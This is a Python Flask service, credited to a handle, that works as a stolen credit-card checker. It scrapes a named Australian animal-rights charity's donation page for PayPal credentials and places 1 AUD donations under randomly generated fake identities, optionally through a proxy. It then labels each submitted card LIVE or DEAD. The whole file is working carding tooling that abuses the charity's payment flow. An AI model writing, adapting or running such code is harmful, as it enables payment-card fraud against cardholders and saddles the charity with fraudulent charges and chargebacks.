# Dev : @xoxhunterxd
import requests
import re
import base64
import json
import random
import string
import time
import traceback
from flask import Flask, request, jsonify

app = Flask(__name__)

# --- AU PROXY CONFIGURATION ---
# The script tests this. If it fails or is malformed, it falls back to direct check.
PROXIES = {
    "http": "http://username:password@au.proxyprovider.com:port",
    "https": "http://username:password@au.proxyprovider.com:port"
}

def get_au_identity(session_obj):
    """Fetches high-quality Australian identity, matching the current session's connection."""
    try:
        # Use the session to ensure proxy/direct consistency
        res = session_obj.get('https://randomuser.me/api/?nat=au', timeout=5)
        user_data = res.json()['results'][0]
        return {
            "first": user_data['name']['first'].capitalize(),
            "last": user_data['name']['last'].capitalize(),
            "email": user_data['email']
        }
    except:
        # Fallback local generation if identity API fails
        prefix = ''.join(random.choices(string.ascii_lowercase, k=10))
        return {"first": "Samantha", "last": "Walters", "email": f"{prefix}@outlook.com.au"}

@app.route('/check', methods=['GET'])
def check_card():
    start_time = time.time()
    cc_param = request.args.get('cc')
    
    if not cc_param or cc_param.count('|') != 3:
        return jsonify({"status": "DEAD", "msg": "INVALID_FORMAT", "dev": "@xoxhunterxd"})

    session = requests.Session()
    session.headers.update({
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36'
    })

    # --- PROXY EXCEPTION HANDLING ---
    using_proxy = False
    try:
        # Attempt to validate proxy connection
        test_res = requests.get('https://google.com', proxies=PROXIES, timeout=3)
        session.proxies.update(PROXIES)
        using_proxy = True
    except:
        # Fallback: Proceed without proxy if configured incorrectly or down
        session.proxies = {}
        using_proxy = False

    try:
        # 0. Card Parsing
        number, month, year_short, cvv = cc_param.split('|')
        month = month.zfill(2)
        year_full = f"20{year_short[-2:]}"

        # 1. Scrape AU Merchant Configuration (Deterministic Extraction)
        init_html = session.get('https://animalrights.org.au/donate-now/').text
        form_url = re.search(r"data-form-view-url=['\"]([^'\"]+)['\"]", init_html).group(1).replace('&#038;', '&')
        form_html = session.get(form_url).text
        
        client_id = re.search(r'["\']clientId["\']\s*:\s*["\']([^"\']+)["\']', form_html).group(1)
        form_id = re.search(r'["\']donationFormId["\']\s*:\s*(\d+)', form_html).group(1)
        nonce = re.search(r'["\']donationFormNonce["\']\s*:\s*["\']([^"\']+)["\']', form_html).group(1)
        donate_url = re.search(r'["\']donateUrl["\']\s*:\s*["\']([^"\']+)["\']', form_html).group(1)

        # 2. PayPal Token Generation (OAuth2 v1)
        auth = base64.b64encode(f"{client_id}:".encode()).decode()
        token_res = session.post('https://www.paypal.com/v1/oauth2/token',
                                 headers={'Authorization': f'Basic {auth}'},
                                 data='grant_type=client_credentials').json()
        access_token = token_res.get('access_token')

        # 3. Create Order with AU Identity
        id_data = get_au_identity(session)
        ajax_payload = {
            'action': 'give_paypal_commerce_create_order',
            'give-form-id': form_id,
            'give-form-hash': nonce,
            'give_payment_mode': 'paypal-commerce',
            'give-amount': '1',
            'give_first': id_data['first'],
            'give_last': id_data['last'],
            'give_email': id_data['email'],
            'give-cs-form-currency': 'AUD',
        }
        order_res = session.post('https://animalrights.org.au/wp-admin/admin-ajax.php', data=ajax_payload).json()
        order_id = order_res['data']['id']

        # 4. Confirm Card (PayPal v2 State Transition)
        confirm_res = session.post(
            f"https://www.paypal.com/v2/checkout/orders/{order_id}/confirm-payment-source",
            headers={'Authorization': f'Bearer {access_token}', 'Content-Type': 'application/json'},
            json={"payment_source": {"card": {"number": number, "security_code": cvv, "expiry": f"{year_full}-{month}"}}}
        ).json()

        time_taken = round(time.time() - start_time, 2)

        # 5. Final Site Response Validation (State-Machine Success)
        if confirm_res.get('status') == 'APPROVED':
            # Handle final routing signatures
            route_params = dict(re.findall(r'([^?&]+)=([^&]+)', donate_url.replace('&#038;', '&')))
            final_res = session.post('https://animalrights.org.au/', params={
                'givewp-route': 'donate',
                'givewp-route-signature': route_params.get('givewp-route-signature'),
                'givewp-route-signature-id': route_params.get('givewp-route-signature-id'),
                'givewp-route-signature-expiration': route_params.get('givewp-route-signature-expiration'),
            }, data={
                'amount': '1', 'currency': 'AUD', 'donationType': 'single',
                'formId': form_id, 'gatewayId': 'paypal-commerce',
                'firstName': id_data['first'], 'lastName': id_data['last'], 'email': id_data['email'],
                'anonymous': 'false', 'isEmbed': 'true', 'locale': 'en_AU',
                'gatewayData[payPalOrderId]': order_id,
                'originUrl': 'https://animalrights.org.au/donate-now/',
            })

            is_live = '"success":true' in final_res.text.lower()
            return jsonify({
                "card": cc_param,
                "status": "LIVE" if is_live else "DEAD",
                "msg": "Approved" if is_live else "Site_Security_Declined",
                "gateway_error": "None" if is_live else "PayPal Order declined by merchant security layer.",
                "proxy_used": using_proxy,
                "time_taken": f"{time_taken}s",
                "dev": "@xoxhunterxd",
                "full_info": id_data
            })
        else:
            # Documented PayPal decline
            error_msg = confirm_res.get('details', [{}])[0].get('issue', 'DECLINED')
            return jsonify({
                "card": cc_param, "status": "DEAD", "msg": error_msg,
                "gateway_error": "PayPal level decline.", "proxy_used": using_proxy,
                "time_taken": f"{time_taken}s", "dev": "@xoxhunterxd", "full_info": id_data
            })

    except Exception as e:
        time_taken = round(time.time() - start_time, 2)
        return jsonify({
            "card": cc_param, "status": "DEAD", "msg": "GATE_ERROR",
            "gateway_error": str(e), "proxy_used": using_proxy,
            "time_taken": f"{time_taken}s", "dev": "@xoxhunterxd", "full_info": id_data
        }), 200

application = app
